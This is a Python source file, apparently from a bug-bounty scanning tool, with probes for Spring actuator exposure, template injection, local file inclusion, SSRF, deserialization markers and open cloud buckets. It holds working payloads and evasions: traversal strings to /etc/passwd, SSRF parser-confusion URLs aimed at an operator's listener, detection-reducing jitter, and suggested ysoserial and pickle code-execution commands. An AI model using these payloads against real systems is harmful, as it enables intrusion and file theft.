                leaks = [k for k in self.SECRET_KEYS_RE.findall(body)
                         if "******" not in body]
                if leaks:
                    extra["secret-key-classes"] = sorted(set(leaks))[:8]
                    title = f"Spring Boot /env exposes plaintext secrets on {base}"
                else:
                    # Masked but exposed — still high (config topology leak)
                    sev = "high"
            elif signal in ("actuator-jolokia", "legacy-jolokia"):
                # Follow up with /list to enumerate MBeans
                list_url = url.rstrip("/") + "/list"
                lr = await self._get(list_url)
                if lr and lr.status_code == 200 and "json" in (
                        lr.headers.get("content-type") or "").lower():
                    body = lr.text or ""
                    dangerous = [m for m in self.DANGEROUS_MBEANS if m in body]
                    if dangerous:
                        extra["dangerous-mbeans"] = dangerous
                        title = f"Jolokia exposes dangerous MBeans on {base}"
                    extra["mbean-list-length"] = len(body)
            elif signal in ("actuator-heapdump", "legacy-heapdump"):
                # Do NOT download (50-500 MB). Just flag presence + size hint.
                extra["heapdump-content-length"] = r.headers.get("content-length")
                title = f"Spring Boot heapdump endpoint live on {base}"
            elif signal in ("actuator-info", "actuator-root"):
                # Version extraction for n-day CVE matching
                m = re.search(r'"(?:version|build\.version)"\s*:\s*"([^"]+)"', body)
                if m:
                    extra["spring-version"] = m.group(1)

            findings_local: list[DeepScanFinding] = []
            findings_local.append(DeepScanFinding(
                url=url, probe=self.name, signal=signal, severity=sev,
                title=title,
                evidence=body[:300],
                extra=extra,
            ))
            return findings_local

        # Cap concurrency per base — actuator surface is ~20 paths, don't
        # blast all at once if rate_limit_rps is set.
        coros = [probe_one(b, p, s, sv) for b in bases
                 for p, s, sv in self.ACTUATOR_PATHS]
        results = await asyncio.gather(*coros, return_exceptions=False)
        for r in results:
            if r:
                findings.extend(r)
        return findings


class SSTIFingerprintProbe(DeepScanProbe):
    """Server-Side Template Injection fingerprint via math-only payloads.

    Each payload uses a multiplication that the corresponding template
    engine evaluates server-side. If the response contains the result
    (49) but the payload itself does not (i.e., the engine actually
    evaluated it), we have evidence of SSTI.

    Safety: payloads are arithmetic only. No filesystem access, no
    process spawning, no environment dumping, no module/import calls.
    This probe identifies *engine*, not exploitability — the user
    confirms RCE manually with engine-specific gadgets.

    Engines mapped:
      {{7*7}}     Jinja2 / Twig / Liquid / Pebble
      ${7*7}     FreeMarker / Spring EL / Velocity-as-of-2.x
      <%=7*7%>   ERB / JSP / EJS-classic
      #{7*7}     Ruby string interpolation / Slim
      {{= 7*7 }} lodash / underscore _.template
      [[7*7]]    Spring MVC SpEL alt
      {7*7}      Smarty / Handlebars-lax
    """
    name = "ssti-fingerprint"
    PAYLOADS: list[tuple[str, str, str]] = [
        # (raw payload string, expected result substring, candidate engine)
        ("{{7*7}}",      "49", "Jinja2/Twig/Liquid/Pebble"),
        ("${7*7}",       "49", "FreeMarker/SpringEL/Velocity"),
        ("<%=7*7%>",     "49", "ERB/JSP/EJS-classic"),
        ("#{7*7}",       "49", "Ruby-interp/Slim"),
        ("{{= 7*7 }}",   "49", "lodash/underscore"),
        ("[[${7*7}]]",   "49", "Thymeleaf"),
        ("{7*7}",        "49", "Smarty/Handlebars-lax"),
    ]
    # Param names commonly reflected in template responses. Order matters —
    # higher-yield names first to short-circuit on rate-limited runs.
    REFLECTED_PARAMS = (
        "q", "search", "query", "name", "title", "message", "comment",
        "text", "input", "value", "redirect", "url", "callback",
        "page", "view", "id", "filter",
    )
    # Cap fingerprint attempts per base so a 100-host run doesn't fan out
    # to thousands of requests. With 7 payloads × 17 params, full cross
    # would be 119 reqs/base — cap to the first 4 params × 7 payloads = 28.
    MAX_PARAMS_PER_BASE = 4

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        findings: list[DeepScanFinding] = []
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") and 200 <= p["status_code"] < 400})
        if not bases:
            return findings
        log.info("ssti-fingerprint", bases=len(bases),
                 payloads=len(self.PAYLOADS),
                 params_per_base=self.MAX_PARAMS_PER_BASE)

        async def baseline(base: str) -> str:
            """Fetch base URL once to know what '49' baseline-body looks like.
            If '49' already appears (e.g., page contains the year, a count,
            etc.), we MUST require a higher signal than just '49' appearing."""
            r = await self._get(base)
            return r.text if r else ""

        async def fingerprint_one(base: str, param: str, payload: str,
                                   expected: str, engine: str,
                                   baseline_body: str):
            # GET ?param=payload. URL-encode the payload.
            from urllib.parse import urlencode, urlparse
            pu = urlparse(base)
            # Skip if base already has query — would clobber semantics
            sep = "&" if pu.query else "?"
            url = f"{base.rstrip('/')}/{sep[0]}{urlencode({param: payload})}"
            # Construct properly: base + ? + encoded
            url = f"{base.rstrip('/')}?{urlencode({param: payload})}"
            r = await self._get(url)
            if r is None or r.status_code >= 400:
                return None
            body = r.text or ""
            # Must contain the result
            if expected not in body:
                return None
            # Must NOT contain the raw payload (or engine just echoed it back)
            if payload in body:
                return None
            # Result must appear with higher frequency than in baseline
            # (defends against pages that happen to contain "49")
            if body.count(expected) <= baseline_body.count(expected):
                return None
            return DeepScanFinding(
                url=url, probe=self.name,
                signal="ssti-engine-confirmed",
                severity="high",
                title=f"SSTI fingerprint: {engine} engine reflected math({payload}) on {base}",
                evidence=(
                    f"Payload: {payload}\n"
                    f"Expected: {expected} appears (baseline: "
                    f"{baseline_body.count(expected)}, response: "
                    f"{body.count(expected)})\n"
                    f"Response excerpt: {body[:300]}"
                ),
                extra={"engine-candidates": engine, "param": param,
                       "payload": payload},
            )

        baselines = dict(zip(bases,
                              await asyncio.gather(*(baseline(b) for b in bases))))
        coros = []
        for b in bases:
            for param in self.REFLECTED_PARAMS[:self.MAX_PARAMS_PER_BASE]:
                for payload, expected, engine in self.PAYLOADS:
                    coros.append(fingerprint_one(
                        b, param, payload, expected, engine, baselines[b]))
        results = await asyncio.gather(*coros, return_exceptions=False)
        for r in results:
            if r:
                findings.append(r)
        return findings


class LFIFlagProbe(DeepScanProbe):
    """Local-file-inclusion canary reads.

    Two read targets:
      * `/etc/passwd` — universal LFI confirmation (response contains
        `root:x:0:0` only when the server has actually read the file)
      * `/flag.txt` (and `/flag`, `/flag.html`) — explicit T-Mobile-style
        flag-capture target; some programs expose flags at root paths
        on T&P-class servers, making direct reads possible without
        traversal at all

    Payload set covers the standard traversal evasions: `..%2f`, `....//`,
    URL-encoded variants, plus `php://filter` for PHP targets. Params
    chosen are the highest-yield names from observed LFI write-ups.

    Detection only — never opens shells, never executes the included
    file, never reads beyond the canary. The point is to surface a lead
    the operator manually confirms in Burp before submission.
    """
    name = "lfi-flag"
    PAYLOADS = [
        # (label, payload, canary substring, severity)
        ("traversal-3",         "../../../etc/passwd",                    "root:x:0:0", "critical"),
        ("traversal-4",         "../../../../etc/passwd",                 "root:x:0:0", "critical"),
        ("traversal-5",         "../../../../../etc/passwd",              "root:x:0:0", "critical"),
        ("traversal-6",         "../../../../../../etc/passwd",           "root:x:0:0", "critical"),
        ("traversal-url-enc",   "..%2F..%2F..%2Fetc%2Fpasswd",            "root:x:0:0", "critical"),
        ("traversal-dbl-enc",   "..%252F..%252F..%252Fetc%252Fpasswd",    "root:x:0:0", "critical"),
        ("traversal-mixed",     "....//....//....//etc/passwd",           "root:x:0:0", "critical"),
        ("php-filter-passwd",   "php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vdDp4OjA6MA==", "critical"),
        # Direct flag-target reads — for T&P-style flag.txt hosts where the
        # flag is at root and no traversal is required
        ("direct-flag-txt",     "/flag.txt",                              "flag",       "critical"),
        ("direct-flag",         "/flag",                                  "flag",       "high"),
        ("direct-flag-html",    "/flag.html",                             "flag",       "high"),
    ]
    PARAMS = ("file", "path", "template", "page", "include", "doc",
              "view", "name", "image", "load", "read", "src")
    # Cap fan-out: per base we try direct + (params × payloads) but
    # ceiling at 30 reqs to keep within rate budgets
    MAX_REQS_PER_BASE = 30

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        findings: list[DeepScanFinding] = []
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") and 200 <= p["status_code"] < 400})
        if not bases:
            return findings
        log.info("lfi-flag", bases=len(bases), payloads=len(self.PAYLOADS))

        from urllib.parse import urlencode

        async def try_direct(base: str, payload: str, canary: str, sev: str, label: str):
            """Direct path read (no traversal, no param injection)."""
            url = base.rstrip("/") + payload
            r = await self._get(url)
            if r is None or r.status_code != 200:
                return None
            body = (r.text or "")[:4096]
            if canary not in body.lower() and canary not in body:
                return None
            return DeepScanFinding(
                url=url, probe=self.name, signal=f"lfi-direct-{label}",
                severity=sev,
                title=f"Direct file read on {base}: {payload}",
                evidence=body[:300],
                extra={"payload": payload, "canary": canary},
            )

        async def try_param(base: str, param: str, payload: str,
                            canary: str, sev: str, label: str):
            url = f"{base.rstrip('/')}?{urlencode({param: payload})}"
            r = await self._get(url)
            if r is None or r.status_code >= 400:
                return None
            body = (r.text or "")[:4096]
            if canary not in body.lower() and canary not in body:
                return None
            return DeepScanFinding(
                url=url, probe=self.name, signal=f"lfi-param-{label}",
                severity=sev,
                title=f"LFI via ?{param}= on {base} ({label})",
                evidence=body[:300],
                extra={"param": param, "payload": payload, "canary": canary},
            )

        coros = []
        for b in bases:
            # Budget: direct probes (3) + first few (param × payload) combos
            reqs_remaining = self.MAX_REQS_PER_BASE
            for label, payload, canary, sev in self.PAYLOADS:
                if payload.startswith("/"):
                    coros.append(try_direct(b, payload, canary, sev, label))
                    reqs_remaining -= 1
            for param in self.PARAMS:
                for label, payload, canary, sev in self.PAYLOADS:
                    if payload.startswith("/"):
                        continue
                    if reqs_remaining <= 0:
                        break
                    coros.append(try_param(b, param, payload, canary, sev, label))
                    reqs_remaining -= 1
                if reqs_remaining <= 0:
                    break

        results = await asyncio.gather(*coros, return_exceptions=False)
        for r in results:
            if r:
                findings.append(r)
        return findings


class SSRFOOBProbe(DeepScanProbe):
    """Server-side request forgery candidate identification + optional
    out-of-band confirmation + optional internal-target pivot.

    Three operating modes (selected automatically based on env vars):

    1. HEURISTIC (no env vars set, default) — identifies URL-handling
       params (`url`, `callback`, `redirect_uri`, `image_url`, `source`,
       `target`, `proxy`, `fetch`, `link`, `dest`, `webhook`) on each
       base and emits an INFO finding for the operator to manually
       confirm in Burp. No request to any target involving the param
       sink — pure surface mapping.

    2. OOB-ACTIVE (`BBSENTINEL_OOB_HOST` set) — injects the OOB host
       (e.g., Burp Collaborator domain or interactsh client) as each
       SSRF-prone param's value. Confirmation is the operator checking
       their OOB listener for incoming DNS/HTTP. Probe emits HIGH
       finding "SSRF candidate, OOB payload sent" — final confirmation
       is out of band.

    3. INTERNAL-PIVOT (`BBSENTINEL_OOB_HOST` AND
       `BBSENTINEL_PIVOT_URLS` set; comma-separated URLs) — after OOB
       payload, also tries each pivot URL as the param value and
       inspects the response for a target-identifying substring
       (default 'flag'). Use only when the program explicitly
       authorizes reaching specific internal addresses (e.g., a
       bounty's listed RFC1918 flag-capture targets). The pivot URLs
       and the substring stay in env vars, NEVER in this file —
       keeps the probe a generic SSRF tool, with engagement-specific
       targets supplied at runtime by the operator.

    Strict design rule: this probe NEVER sends pivot URLs in mode 1
    or to hosts outside `in_scope_hosts`. The pivot is a follow-up
    that requires both env vars AND the candidate host being in scope.
    """
    name = "ssrf-oob"
    SSRF_PARAMS = (
        "url", "callback", "redirect_uri", "image", "image_url",
        "source", "target", "proxy", "fetch", "link", "dest",
        "webhook", "next", "return_to", "continue", "uri", "src",
        "preview", "thumbnail", "avatar",
    )
    # Subset of SSRF_PARAMS that get HPP / URL-parser-confusion variants
    # in addition to the plain OOB payload. URL-handling-class params
    # only — testing param-duplication on a non-URL param like `next`
    # is rarely productive vs. cost.
    HPP_PARAMS = frozenset({
        "url", "callback", "redirect_uri", "target", "proxy", "fetch",
        "source", "dest", "uri",
    })

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        import os
        self.oob_host = os.environ.get("BBSENTINEL_OOB_HOST") or None
        pivot = os.environ.get("BBSENTINEL_PIVOT_URLS", "").strip()
        self.pivot_urls = [u.strip() for u in pivot.split(",") if u.strip()] if pivot else []
        self.pivot_canary = os.environ.get("BBSENTINEL_PIVOT_CANARY", "flag")
        self.mode = (
            "internal-pivot" if (self.oob_host and self.pivot_urls)
            else "oob-active" if self.oob_host
            else "heuristic"
        )

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        findings: list[DeepScanFinding] = []
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") and 200 <= p["status_code"] < 400})
        if not bases:
            return findings
        log.info("ssrf-oob", bases=len(bases), mode=self.mode,
                 pivot_targets=len(self.pivot_urls))

        from urllib.parse import urlencode, urlparse

        async def probe_base_heuristic(base: str):
            # Mode 1: just emit info findings naming each SSRF-prone param
            # found in the base URL's query string, plus a generic note
            # listing the standard SSRF params we'd want to test manually.
            pu = urlparse(base)
            existing_params = []
            if pu.query:
                for kv in pu.query.split("&"):
                    k = kv.split("=", 1)[0]
                    if k in self.SSRF_PARAMS:
                        existing_params.append(k)
            if existing_params:
                return [DeepScanFinding(
                    url=base, probe=self.name, signal="ssrf-candidate-param",
                    severity="info",
                    title=f"SSRF-prone params present on {base}: {existing_params}",
                    evidence=f"URL contains: {existing_params}\n"
                             f"Suggested manual test: set BBSENTINEL_OOB_HOST + "
                             f"re-run to send OOB payload, or test in Burp.",
                    extra={"params": existing_params, "mode": self.mode},
                )]
            return []

        # Inter-request jitter: random uniform delay between probe requests
        # within a single base. Two reasons:
        #   1. Uniform 333ms-interval traffic is a recognizable scanner
        #      pattern on its own; small randomization reduces the burst
        #      fingerprint without changing the per-second average.
        #   2. Some rate limiters use sliding-window detection that's more
        #      forgiving of varied timing than perfectly-spaced bursts.
        # Per-request jitter is bounded ABOVE by what would push us past
        # the per-program rate cap; if rate_limit_rps is configured we cap
        # the upper bound at 1/rate_limit_rps to stay in budget. NOT a
        # rate-limit-bypass technique — average pacing stays within cap.
        import random as _random
        if self.rate_limit_rps:
            jitter_max = 1.0 / self.rate_limit_rps
            jitter_min = jitter_max * 0.4
        else:
            jitter_min, jitter_max = 0.0, 0.1

        async def jittered_get(url: str):
            await asyncio.sleep(_random.uniform(jitter_min, jitter_max))
            return await self._get(url)

        async def probe_base_active(base: str):
            # Modes 2 & 3: inject OOB host into each candidate param.
            results = []
            for param in self.SSRF_PARAMS:
                url = f"{base.rstrip('/')}?{urlencode({param: f'http://{self.oob_host}/{param}-{hash(base) & 0xffff:x}'})}"
                r = await jittered_get(url)
                if r is None:
                    continue
                # OOB-active: emit HIGH finding; operator confirms via OOB listener
                results.append(DeepScanFinding(
                    url=url, probe=self.name, signal="ssrf-oob-sent",
                    severity="high",
                    title=f"SSRF OOB payload sent via ?{param}= on {base}",
                    evidence=(
                        f"Target: {base}\nParam: {param}\n"
                        f"OOB host: {self.oob_host}\n"
                        f"Response status: {r.status_code}\n"
                        f"Confirm by checking your OOB listener for the "
                        f"hash-tagged hostname."
                    ),
                    extra={"param": param, "oob-host": self.oob_host,
                           "response-status": r.status_code, "mode": self.mode},
                ))
                # Mode 3: also try each pivot URL on this param
                if self.mode == "internal-pivot":
                    for pivot in self.pivot_urls:
                        purl = f"{base.rstrip('/')}?{urlencode({param: pivot})}"
                        pr = await jittered_get(purl)
                        if pr is None:
                            continue
                        body = (pr.text or "")[:4096]
                        if self.pivot_canary.lower() in body.lower():
                            results.append(DeepScanFinding(
                                url=purl, probe=self.name,
                                signal="ssrf-pivot-confirmed",
                                severity="critical",
                                title=f"SSRF pivot SUCCESS via ?{param}= → {pivot} on {base}",
                                evidence=(
                                    f"Pivot target: {pivot}\n"
                                    f"Canary '{self.pivot_canary}' present in response.\n"
                                    f"Response excerpt: {body[:300]}"
                                ),
                                extra={"param": param, "pivot-url": pivot,
                                       "canary": self.pivot_canary,
                                       "mode": self.mode},
                            ))

                # HPP + URL-parser-confusion variants. Many validators
                # check the FIRST or LAST occurrence of a duplicated param,
                # while the back-end uses the opposite. Same for URLs with
                # ambiguous fragment/userinfo/credentials boundaries —
                # the validator parses one way, the fetcher another.
                #
                # Restricted to the highest-yield URL-handling params to
                # keep per-base request count manageable. Validator-bypass
                # classes apply uniformly across param names; testing
                # `url` exhaustively is roughly as informative as testing
                # all 21 params.
                if param in self.HPP_PARAMS:
                    oob_url = f"http://{self.oob_host}/{param}-hpp-{hash(base) & 0xffff:x}"
                    safe_self = base.rstrip("/")
                    hpp_variants = [
                        # Param-duplication (HPP) — validator sees one, fetcher uses other
                        (f"{safe_self}/?{urlencode({param: safe_self})}&{urlencode({param: oob_url})}",
                         "hpp-last-wins"),
                        # URL-parser confusion — validator splits differently than fetcher
                        (f"{safe_self}/?{urlencode({param: f'http://{urlparse(base).netloc}@{self.oob_host}/'})}",
                         "url-parser-userinfo"),
                        (f"{safe_self}/?{urlencode({param: f'http://{self.oob_host}#@{urlparse(base).netloc}/'})}",
                         "url-parser-fragment"),
                    ]
                    for variant_url, variant_kind in hpp_variants:
                        vr = await jittered_get(variant_url)
                        if vr is None:
                            continue
                        results.append(DeepScanFinding(
                            url=variant_url, probe=self.name,
                            signal=f"ssrf-oob-{variant_kind}",
                            severity="high",
                            title=f"SSRF OOB payload sent via {variant_kind} on ?{param}= at {base}",
                            evidence=(
                                f"Variant: {variant_kind}\nParam: {param}\n"
                                f"OOB host: {self.oob_host}\n"
                                f"Response status: {vr.status_code}\n"
                                f"Each variant tests a different validator/fetcher "
                                f"split. Confirm via OOB listener; the inbound "
                                f"hostname includes '-hpp-' so you can identify "
                                f"which validator-bypass class triggered."
                            ),
                            extra={"param": param, "variant": variant_kind,
                                   "oob-host": self.oob_host,
                                   "response-status": vr.status_code,
                                   "mode": self.mode},
                        ))
            return results

        if self.mode == "heuristic":
            coros = [probe_base_heuristic(b) for b in bases]
        else:
            coros = [probe_base_active(b) for b in bases]
        results = await asyncio.gather(*coros, return_exceptions=False)
        for batch in results:
            findings.extend(batch)
        return findings


class FileUploadDiscoveryProbe(DeepScanProbe):
    """Surface file-upload endpoints — discovery only, never uploads.

    For each live HTML page, parses `<form>` elements with
    `enctype="multipart/form-data"` containing `<input type="file">`,
    resolves each form's action URL, and emits a finding naming the
    endpoint + method + field names. The operator follows up manually
    in Burp: tries benign content with mis-declared MIME, double
    extensions (`.php.txt`), null-byte truncation, SVG XSS, etc.

    Why no active upload step: even a benign `bb-sentinel-upload-probe.txt`
    is a state-modifying request. Some programs ban data modification
    outright (T-Mobile's Vistar/Blis: platform ban for modification);
    others accept it but the resulting file persists and pollutes the
    target's filesystem. The probe stays passive — the lead it generates
    is "here's an upload endpoint" and the operator does the active work.
    """
    name = "file-upload-discovery"
    UPLOAD_FORM_RE = re.compile(
        r'<form\b[^>]*\benctype\s*=\s*["\']multipart/form-data["\'][^>]*>'
        r'(.*?)</form>',
        re.IGNORECASE | re.DOTALL,
    )
    FILE_INPUT_RE = re.compile(
        r'<input\b[^>]*\btype\s*=\s*["\']file["\']',
        re.IGNORECASE,
    )
    ACTION_RE  = re.compile(r'\baction\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)
    METHOD_RE  = re.compile(r'\bmethod\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)
    NAME_RE    = re.compile(r'\bname\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)
    # Only crawl pages we already know returned HTML — skip JSON/XML/binary
    MAX_PAGES = 80

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        findings: list[DeepScanFinding] = []
        # Restrict to pages plausibly HTML (status 200, Content-Type text/html)
        html_probes = [p for p in probes
                       if p.get("status_code") == 200
                       and "text/html" in (p.get("content_type") or "").lower()]
        if not html_probes:
            return findings
        log.info("file-upload-discovery", html_pages=len(html_probes))

        from urllib.parse import urljoin

        async def scan_page(base: str):
            r = await self._get(base)
            if r is None or r.status_code != 200:
                return []
            html = r.text or ""
            results = []
            for m in self.UPLOAD_FORM_RE.finditer(html):
                form_body = m.group(1)
                if not self.FILE_INPUT_RE.search(form_body):
                    continue
                # Find action URL — fall back to base if not specified
                action_m = self.ACTION_RE.search(m.group(0))
                action = action_m.group(1) if action_m else ""
                action_url = urljoin(base, action) if action else base
                method_m = self.METHOD_RE.search(m.group(0))
                method = (method_m.group(1) if method_m else "POST").upper()
                # Collect field names
                fields = self.NAME_RE.findall(form_body)
                results.append(DeepScanFinding(
                    url=action_url, probe=self.name,
                    signal="upload-endpoint",
                    severity="medium",
                    title=f"File upload endpoint discovered: {method} {action_url}",
                    evidence=(
                        f"Discovered on: {base}\n"
                        f"Action: {action_url}\n"
                        f"Method: {method}\n"
                        f"Form fields: {fields}\n\n"
                        f"Manual tests to run in Burp:\n"
                        f"  - mis-declared MIME (text/plain claimed, .php content)\n"
                        f"  - double extension (.php.jpg, .phtml)\n"
                        f"  - null-byte truncation (.jpg%00.php)\n"
                        f"  - SVG XSS payload\n"
                        f"  - polyglot file (gif+php)\n"
                        f"  - path-traversal in filename (../webshell.php)"
                    ),
                    extra={"method": method, "fields": fields,
                           "discovered-on": base},
                ))
            return results

        # Cap pages to scan
        coros = [scan_page(p["url"]) for p in html_probes[:self.MAX_PAGES]]
        results = await asyncio.gather(*coros, return_exceptions=False)
        for batch in results:
            findings.extend(batch)
        return findings


class DeserializationProbe(DeepScanProbe):
    """Detect insecure-deserialization markers — passive only.

    Surfaces endpoints/cookies/responses carrying serialized objects
    that an attacker could potentially replace with a gadget chain:

      * Java serialized streams (magic bytes `AC ED 00 05`, or base64
        prefix `rO0AB`) in cookies, response bodies, or query params
      * .NET `__VIEWSTATE` parameter — flags if the matching
        `__VIEWSTATEGENERATOR` cookie/field is missing (ASP.NET's
        MAC validation indicator); MAC-less ViewState is exploitable
        with `ysoserial.net`
      * Python pickle magic bytes (`\\x80\\x04` opcode prefix) in
        `application/octet-stream` responses
      * PHP serialized notation (`s:N:"..."`, `a:N:{...}`, `O:N:"..."`)
        in params and cookies

    Detection only — emits the endpoint, the framework class, and a
    suggested local command for the operator to run for exploitation
    (e.g., `ysoserial -gadget CommonsCollections5 ...`). Never sends
    gadget payloads; never modifies serialized state on the target.
    """
    name = "deserialization-markers"
    JAVA_SERIAL_BIN = b"\xac\xed\x00\x05"
    JAVA_SERIAL_B64 = "rO0AB"   # base64 of AC ED 00 05
    PYTHON_PICKLE_PFX = b"\x80\x04"  # protocol 4
    PHP_SERIAL_RE = re.compile(
        r'(?:^|[^a-zA-Z])(s:\d+:"[^"]*"|a:\d+:\{|O:\d+:"[^"]*"|i:\d+;)'
    )
    VIEWSTATE_RE = re.compile(
        r'name=["\']__VIEWSTATE["\']\s+value=["\']([^"\']+)["\']',
        re.IGNORECASE,
    )
    VIEWSTATE_MAC_RE = re.compile(
        r'name=["\']__VIEWSTATEGENERATOR["\']',
        re.IGNORECASE,
    )

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        findings: list[DeepScanFinding] = []
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") and 200 <= p["status_code"] < 400})
        if not bases:
            return findings
        log.info("deserialization-markers", bases=len(bases))

        async def scan(base: str):
            r = await self._get(base)
            if r is None:
                return []
            results = []
            body_bytes = r.content or b""
            body_text = (r.text or "")
            ctype = (r.headers.get("content-type") or "").lower()

            # Java serialized stream
            if (self.JAVA_SERIAL_BIN in body_bytes or
                    self.JAVA_SERIAL_B64 in body_text):
                results.append(DeepScanFinding(
                    url=base, probe=self.name,
                    signal="deserialization-java",
                    severity="high",
                    title=f"Java serialized stream marker in response on {base}",
                    evidence=(
                        f"Detected magic: AC ED 00 05 (or rO0AB base64).\n"
                        f"Content-Type: {ctype}\n"
                        f"Manual follow-up:\n"
                        f"  ysoserial -gadget CommonsCollections5 -formatter "
                        f"Serialize -payload 'id' | xxd"
                    ),
                    extra={"content-type": ctype},
                ))
            # Java serialized in cookies
            cookies = r.headers.get("set-cookie", "")
            if self.JAVA_SERIAL_B64 in cookies:
                results.append(DeepScanFinding(
                    url=base, probe=self.name,
                    signal="deserialization-java-cookie",
                    severity="high",
                    title=f"Java serialized stream in Set-Cookie on {base}",
                    evidence=f"Cookie: {cookies[:300]}",
                    extra={"cookie": cookies[:200]},
                ))
            # .NET ViewState
            vs_match = self.VIEWSTATE_RE.search(body_text)
            if vs_match:
                has_mac = bool(self.VIEWSTATE_MAC_RE.search(body_text))
                results.append(DeepScanFinding(
                    url=base, probe=self.name,
                    signal=("deserialization-viewstate-no-mac"
                            if not has_mac else "deserialization-viewstate"),
                    severity=("critical" if not has_mac else "medium"),
                    title=(f"ASP.NET __VIEWSTATE on {base} — "
                           f"{'NO MAC validator' if not has_mac else 'MAC present'}"),
                    evidence=(
                        f"__VIEWSTATE: {vs_match.group(1)[:80]}...\n"
                        f"__VIEWSTATEGENERATOR present: {has_mac}\n"
                        f"Manual follow-up:\n"
                        f"  ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter "
                        f"-c 'whoami' --validationkey ... --validationalg HMACSHA256"
                    ),
                    extra={"has-mac-validator": has_mac,
                           "viewstate-prefix": vs_match.group(1)[:40]},
                ))
            # Python pickle
            if (body_bytes.startswith(self.PYTHON_PICKLE_PFX) and
                    "octet-stream" in ctype):
                results.append(DeepScanFinding(
                    url=base, probe=self.name,
                    signal="deserialization-pickle",
                    severity="high",
                    title=f"Python pickle stream on {base}",
                    evidence=(
                        f"Body starts with pickle protocol 4 magic.\n"
                        f"Manual follow-up: craft a pickle payload with a "
                        f"__reduce__ method that returns (os.system, ('id',))"
                    ),
                    extra={"content-type": ctype,
                           "body-prefix-hex": body_bytes[:16].hex()},
                ))
            # PHP serialized
            if self.PHP_SERIAL_RE.search(body_text[:8192]):
                results.append(DeepScanFinding(
                    url=base, probe=self.name,
                    signal="deserialization-php",
                    severity="medium",
                    title=f"PHP serialized data in response on {base}",
                    evidence=(
                        f"Pattern matched.\n"
                        f"Manual follow-up: identify gadget chain in app's "
                        f"loaded classes, craft phpggc payload."
                    ),
                    extra={"content-type": ctype},
                ))
            return results

        coros = [scan(b) for b in bases]
        results = await asyncio.gather(*coros, return_exceptions=False)
        for batch in results:
            findings.extend(batch)
        return findings


class ObjectStorageProbe(DeepScanProbe):
    """Cloud object-storage misconfig detection.

    Two-phase: (1) extract bucket URIs from each page's HTML and any
    `<script src=>` JS bundles; (2) for each unique bucket, GET the
    root URL and (where the provider supports it) the listing API.
    A 200 + XML/JSON listing = anonymous read+list = high severity.

    Providers covered: AWS S3 (path-style + virtual-host-style + region
    variants), Google Cloud Storage, Azure Blob, Alibaba OSS,
    DigitalOcean Spaces, Cloudflare R2, Wasabi. Pattern set updated
    when public dumps surface new TLD shapes.

    Detection only — never PUTs, never DELETEs, never writes a probe
    file. Listing the bucket counts as a read. If the operator wants
    to write-test a bucket for full takeover proof, they do it manually.
    """
    name = "object-storage"
    BUCKET_RES: list[tuple[str, str]] = [
        # (regex, provider-tag)
        (r"https?://([a-z0-9.\-]+)\.s3[.\-][a-z0-9\-]+\.amazonaws\.com",  "s3-vhost"),
        (r"https?://s3[.\-][a-z0-9\-]+\.amazonaws\.com/([a-z0-9.\-]+)/", "s3-path"),
        (r"https?://([a-z0-9.\-]+)\.storage\.googleapis\.com",            "gcs-vhost"),
        (r"https?://storage\.googleapis\.com/([a-z0-9.\-]+)/",             "gcs-path"),
        (r"https?://([a-z0-9.\-]+)\.blob\.core\.windows\.net",             "azure-blob"),
        (r"https?://([a-z0-9.\-]+)\.oss-[a-z0-9\-]+\.aliyuncs\.com",       "alibaba-oss"),
        (r"https?://([a-z0-9.\-]+)\.[a-z0-9\-]+\.digitaloceanspaces\.com", "do-spaces"),
        (r"https?://([a-z0-9.\-]+)\.r2\.cloudflarestorage\.com",           "cf-r2"),
        (r"https?://([a-z0-9.\-]+)\.s3\.wasabisys\.com",                   "wasabi"),
    ]

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        findings: list[DeepScanFinding] = []
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") == 200})
        if not bases:
            return findings
        log.info("object-storage", bases=len(bases))

        # Extract bucket URIs from each base + its inline script srcs
        found_buckets: dict[str, tuple[str, str]] = {}  # bucket -> (provider, found-on)
        async def extract(base: str):
            r = await self._get(base)
            if r is None or r.status_code != 200:
                return
            text = r.text or ""
            for pattern, provider in self.BUCKET_RES:
                for m in re.finditer(pattern, text, re.IGNORECASE):
                    bucket = m.group(1)
                    if bucket and bucket not in found_buckets:
                        found_buckets[bucket] = (provider, base)

        await asyncio.gather(*(extract(b) for b in bases))

        # For each bucket, test anonymous read + listing
        async def test_bucket(bucket: str, provider: str, found_on: str):
            test_results = []
            # Construct probe URL for read + listing per provider
            if provider == "s3-vhost":
                root = f"https://{bucket}.s3.amazonaws.com/"
                listing = f"https://{bucket}.s3.amazonaws.com/?list-type=2"
            elif provider == "s3-path":
                root = f"https://s3.amazonaws.com/{bucket}/"
                listing = f"https://s3.amazonaws.com/{bucket}/?list-type=2"
            elif provider == "gcs-vhost":
                root = f"https://{bucket}.storage.googleapis.com/"
                listing = root  # GCS XML listing is root with ?prefix=
            elif provider == "azure-blob":
                root = f"https://{bucket}.blob.core.windows.net/"
                listing = f"https://{bucket}.blob.core.windows.net/?comp=list"
            else:
                root = listing = ""
            if not root:
                return []
            r_root = await self._get(root)
            r_list = await self._get(listing) if listing != root else r_root
            ev_parts = [f"Provider: {provider}", f"Bucket: {bucket}",
                        f"Discovered on: {found_on}"]
            severity = None
            signal = None
            if r_list and r_list.status_code == 200 and (
                "<ListBucketResult" in (r_list.text or "")
                or "<EnumerationResults" in (r_list.text or "")
                or "<Contents>" in (r_list.text or "")):
                severity = "high"
                signal = "bucket-anonymous-listing"
                ev_parts.append(f"Listing API returned 200 with bucket contents.\n"
                                f"Excerpt:\n{(r_list.text or '')[:400]}")
            elif r_root and r_root.status_code == 200:
                severity = "medium"
                signal = "bucket-anonymous-read"
